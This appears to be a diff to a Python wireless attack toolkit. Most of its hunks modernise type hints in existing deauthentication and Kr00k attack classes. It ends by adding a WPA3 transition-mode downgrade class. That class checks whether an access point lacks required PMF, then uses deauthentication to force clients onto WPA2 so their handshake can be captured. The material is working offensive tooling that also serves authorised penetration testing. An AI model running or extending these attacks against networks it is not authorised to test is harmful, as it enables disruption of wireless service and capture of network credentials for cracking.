@@ -8,9 +8,9 @@ Academic References & Tool Credits:
 
 import asyncio
 import time
+from collections.abc import Callable
 from datetime import datetime
 from pathlib import Path
-from typing import Callable, List, Optional
 
 import structlog
 
@@ -31,7 +31,7 @@ class DeauthAttack(BaseAttack):
     def __init__(
         self,
         interface: str,
-        output_dir: Optional[str] = None,
+        output_dir: str | None = None,
         attack_timeout: int = 30,
     ):
         if output_dir is None:
@@ -42,9 +42,9 @@ class DeauthAttack(BaseAttack):
     async def execute(
         self,
         target_bssid: str,
-        target_essid: Optional[str] = None,
+        target_essid: str | None = None,
         channel: int = 1,
-        callback: Optional[Callable[[str], None]] = None,
+        callback: Callable[[str], None] | None = None,
         **kwargs,
     ) -> AttackResult:
         client_mac = kwargs.get("client_mac")
@@ -121,7 +121,7 @@ class Kr00kAttack(BaseAttack):
     def __init__(
         self,
         interface: str,
-        output_dir: Optional[str] = None,
+        output_dir: str | None = None,
         attack_timeout: int = 60,
         deauth_count: int = 10,
         capture_after_deauth: int = 10,
@@ -137,9 +137,9 @@ class Kr00kAttack(BaseAttack):
     async def execute(
         self,
         target_bssid: str,
-        target_essid: Optional[str] = None,
+        target_essid: str | None = None,
         channel: int = 1,
-        callback: Optional[Callable[[str], None]] = None,
+        callback: Callable[[str], None] | None = None,
         **kwargs,
     ) -> AttackResult:
         client_mac = kwargs.get("client_mac")
@@ -203,7 +203,7 @@ class Kr00kAttack(BaseAttack):
             airodump_proc.terminate()
             try:
                 await asyncio.wait_for(airodump_proc.wait(), timeout=5)
-            except asyncio.TimeoutError:
+            except TimeoutError:
                 airodump_proc.kill()
                 await airodump_proc.wait()
 
@@ -273,7 +273,7 @@ class Kr00kAttack(BaseAttack):
             self._log("Kr00k analysis failed", error=str(e))
             return 0
 
-    async def _decrypt_kr00k(self, cap_file: Path, output_dir: Path) -> Optional[List[str]]:
+    async def _decrypt_kr00k(self, cap_file: Path, output_dir: Path) -> list[str] | None:
         """Attempt to decrypt Kr00k frames using r00kie-kr00kie tool."""
         try:
             import shutil
@@ -300,3 +300,95 @@ class Kr00kAttack(BaseAttack):
         except Exception as e:
             self._log("Kr00k decryption failed", error=str(e))
             return None
+
+
+class WPA3DowngradeAttack(BaseAttack):
+    """
+    WPA3 Transition-Mode Downgrade.
+
+    WPA3 transition-mode APs advertise both SAE (WPA3) and PSK (WPA2) so
+    legacy clients can still associate. Forcing a client off with
+    deauthentication can make it re-associate over the weaker WPA2/PSK path,
+    where a standard 4-way-handshake capture becomes possible. A WPA3-only AP
+    (PMF required) cannot be downgraded this way.
+    """
+
+    def __init__(
+        self,
+        interface: str,
+        output_dir: str | None = None,
+        attack_timeout: int = 60,
+        deauth_count: int = 10,
+    ):
+        if output_dir is None:
+            from urban_hs.core.config import get_config
+            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "wpa3_downgrade")
+        super().__init__(interface, output_dir, attack_timeout)
+        self.deauth_count = deauth_count
+        self.deauth_attack = DeauthAttack(interface, attack_timeout=30)
+
+    @staticmethod
+    def is_transition_mode(network: object) -> bool:
+        """Return True if *network* is a downgradable WPA3 transition-mode AP.
+
+        Accepts a ``NetworkInfo`` or a plain dict. Transition mode advertises
+        WPA3/SAE but does not *require* PMF; a WPA3-only AP mandates
+        ``pmf == "required"`` and is therefore not downgradable.
+        """
+        if isinstance(network, dict):
+            encryption = str(network.get("encryption", ""))
+            pmf = str(network.get("pmf", "")).lower()
+        else:
+            encryption = str(getattr(network, "encryption", ""))
+            pmf = str(getattr(network, "pmf", "")).lower()
+        return "WPA3" in encryption.upper() and pmf != "required"
+
+    async def execute(
+        self,
+        target_bssid: str,
+        target_essid: str | None = None,
+        channel: int = 1,
+        callback: Callable[[str], None] | None = None,
+        **kwargs,
+    ) -> AttackResult:
+        client_mac = kwargs.get("client_mac")
+
+        result = AttackResult(
+            attack_type="wpa3_downgrade",
+            target_bssid=target_bssid,
+            target_essid=target_essid,
+            status=AttackStatus.RUNNING,
+            started_at=datetime.utcnow(),
+            metadata={"client_mac": client_mac, "deauth_count": self.deauth_count},
+        )
+
+        self._running = True
+        try:
+            self._log("Starting WPA3 transition downgrade", bssid=target_bssid, channel=channel)
+            self._notify_callback(
+                callback, "Forcing re-association via deauth (WPA3 transition downgrade)"
+            )
+
+            deauth_result = await self.deauth_attack.execute(
+                target_bssid=target_bssid,
+                target_essid=target_essid,
+                channel=channel,
+                callback=callback,
+                client_mac=client_mac,
+                count=self.deauth_count,
+            )
+
+            result.status = deauth_result.status
+            result.metadata["deauth_status"] = deauth_result.status.value
+            result.metadata["note"] = (
+                "Clients forced off; capture a WPA2 4-way handshake on reconnection."
+            )
+            result.finished_at = datetime.utcnow()
+        except Exception as e:
+            result.status = AttackStatus.FAILED
+            result.error_message = str(e)
+            self._log("WPA3 downgrade failed", error=str(e))
+        finally:
+            self._running = False
+
+        return result
